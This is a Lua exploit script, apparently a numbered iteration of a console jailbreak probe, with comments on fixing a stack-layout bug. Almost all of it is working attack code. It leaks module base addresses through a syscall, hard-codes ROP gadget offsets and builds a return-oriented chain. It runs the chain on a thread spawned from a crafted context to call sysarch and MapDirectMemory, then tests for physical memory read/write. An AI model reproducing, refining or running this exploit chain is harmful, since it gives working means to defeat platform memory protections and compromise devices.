-- CRASH_CLASS: HIGH
-- PROBE 531z: MapDirectMemory with FIXED post-call chain
--
-- Bug in 531x/531y: after map_fn returns, RSP points to the 'name' slot.
-- pop_rdi_ret pops name=0 into RDI, then rets to shared+0x08 (DATA, not code).
--
-- Fix: use a "pop rdi; ret" gadget AS the return addr from map_fn.
-- When map_fn rets → pops return_addr into RIP (= pop_rdi_ret gadget).
-- RSP now points to name=0. pop_rdi pops name(0) into RDI (harmless).
-- Then ret pops the NEXT qword as RIP (which is our actual continuation).
--
-- Layout:
--   [map_fn]
--   [pop_rdi_ret]      ← return addr: this "eats" the name slot
--   [0 = name]         ← popped into RDI by pop_rdi_ret (harmless)
--   [pop_rdi_ret]      ← continuation: real chain resumes here
--   [shared+0x10]      ← rdi = &map_rv
--   [mov_rdi_rax_ret]  ← store rax (MapDM rv) to shared[0x10]
--   ...

print("=== PROBE 531z: MAPDM FIXED ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
print("lk=" .. q(lk))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)
local alloc_fn = lk + uint64(0x17EF0)
local map_fn = lk + uint64(0x15020)

-- [A] AllocateDirectMemory
print("[A] Alloc phys")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FAIL: no phys") return end

-- [B] Setup shared, stack, TCB
print("[B] Setup")
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)
wq(shared + 0x00, uint64(0))        -- VA output
wq(shared + 0x08, uint64(0xAAAA))   -- sysarch rv
wq(shared + 0x10, uint64(0xBBBB))   -- MapDM rv
wq(shared + 0x18, uint64(0xCCCC))   -- done marker

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

print("  shared=" .. q(shared))
print("  stack=" .. q(stack_base))

-- [C] Build ROP chain
print("[C] Chain")
local chain = stack_base + 0x200000 - 0x800
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- Phase 1: sysarch(165, SET_FSBASE=129, &tcb)
emit(uint64(165))         -- rax = 165 (popped by initial pop_rax_ret RIP)
emit(pop_rdi_ret)
emit(uint64(129))         -- rdi = SET_FSBASE
emit(pop_rsi_ret)
emit(tcb_ptr)             -- rsi = &tcb_ptr
emit(syscall_ret)         -- sysarch(165, 129, &tcb_ptr)

-- Store sysarch rv
emit(pop_rdi_ret)
emit(shared + 0x08)
emit(mov_rdi_rax_ret)     -- shared[0x08] = sysarch rv

-- Phase 2: MapDirectMemory(out_ptr, len, prot, flags, phys, align, name)
-- rdi = out_ptr, rsi = len, rdx = prot, rcx = flags
-- r8 = phys (from initial context), r9 = align (from initial context)
-- name = 7th arg on stack

emit(pop_rdi_ret)
emit(shared + 0x00)       -- rdi = &VA_output
emit(pop_rsi_ret)
emit(uint64(0x4000))      -- rsi = 16KB
emit(pop_rdx_ret)
emit(uint64(3))           -- rdx = PROT_READ|PROT_WRITE
emit(pop_rcx_ret)
emit(uint64(0))           -- rcx = flags = 0

-- "call" map_fn via ret
-- When this ret fires: RSP → [return_addr, name, continuation...]
-- map_fn's prologue sees: [RSP]=return_addr, [RSP+8]=name (7th arg)
-- map_fn's epilogue does: ret → pops return_addr → jumps there, RSP → name
--
-- TRICK: use pop_rdi_ret as return_addr. It "eats" the name slot:
--   pop rdi ← pops name(0) into RDI (harmless clobber, we don't need RDI value)
--   ret     ← pops next qword as RIP → our real continuation
emit(map_fn)
emit(pop_rdi_ret)          -- return addr = pop_rdi_ret gadget (eats name)
emit(uint64(0))            -- name = NULL (7th arg, gets popped into RDI)

-- Continuation: rax = MapDM return value
-- Store MapDM rv → shared[0x10]
emit(pop_rdi_ret)
emit(shared + 0x10)
emit(mov_rdi_rax_ret)     -- shared[0x10] = MapDM rv

-- Done marker
emit(pop_rdi_ret)
emit(shared + 0x18)
emit(pop_rax_ret)
emit(uint64(0x444F4E45))  -- "DONE"
emit(mov_rdi_rax_ret)     -- shared[0x18] = "DONE"

-- thr_exit(0)
emit(pop_rax_ret)
emit(uint64(431))         -- thr_exit
emit(pop_rdi_ret)
emit(uint64(0))           -- exit code
emit(syscall_ret)

print(string.format("  chain=%d bytes (%d entries)", i, i/8))

-- [D] Context
print("[D] Context")
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)     -- RIP = pop_rax_ret
wq(ctx + 0x0F8, chain)            -- RSP = chain (first entry is rax value)
-- r8 = phys offset, r9 = alignment
wq(ctx + 0x068, phys)             -- r8
wq(ctx + 0x070, uint64(0x4000))   -- r9 = 16KB alignment

print("  r8(phys)=" .. q(phys))
print("  r9(align)=0x4000")

-- [E] Spawn
print("[E] thr_create")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

if to_num(rv_tc) ~= 0 then
    print("  CONTEXT REJECTED")
    print("=== 531z DONE ===")
    return
end

-- [F] Wait for done marker (up to 3s)
print("[F] Wait")
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 100000000)  -- 100ms
local done = false
for attempt = 1, 30 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local m = rq(shared + 0x18)
    if m then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 and mn ~= 0xCCCC then
            done = true
            break
        end
    end
end

-- [G] Results
print("[G] Results")
print("  sysarch=" .. q(rq(shared + 0x08)))
print("  map_rv=" .. q(rq(shared + 0x10)))
print("  va=" .. q(rq(shared + 0x00)))
print("  done=" .. q(rq(shared + 0x18)) .. " (" .. tostring(done) .. ")")

local va_out = rq(shared + 0x00)
if va_out and to_num(va_out) ~= 0 then
    print("")
    print("[H] *** MAPPED PHYSICAL MEMORY ***")
    local ok_w = pcall(function() memory.write_dword(va_out, 0xCAFEBABE) end)
    local rb_val = rd(to_num(va_out))
    if rb_val then
        if rb_val < 0 then rb_val = rb_val + 0x100000000 end
        print(string.format("  write 0xCAFEBABE -> read 0x%08X", rb_val))
        if rb_val == 0xCAFEBABE then
            print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
        end
    else
        print("  READ FAULT at VA " .. q(va_out))
    end
else
    print("  NO VA returned")
    local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
    print("  thr_kill=" .. tostring(to_num(rv_k)))
    if to_num(rv_k) == 0 then
        print("  (child still alive — crashed before done marker?)")
    else
        print("  (child dead — crashed during chain)")
    end
    -- Check if sysarch succeeded
    local sa = rq(shared + 0x08)
    local san = to_num(sa)
    if san == 0 then
        print("  sysarch OK but MapDM crashed or returned error")
    elseif san ~= 0 and san ~= 0xAAAA then
        print("  sysarch returned non-zero: " .. q(sa))
    else
        print("  sysarch never wrote (chain crashed before sysarch)")
    end
end

print("")
print("=== 531z DONE ===")
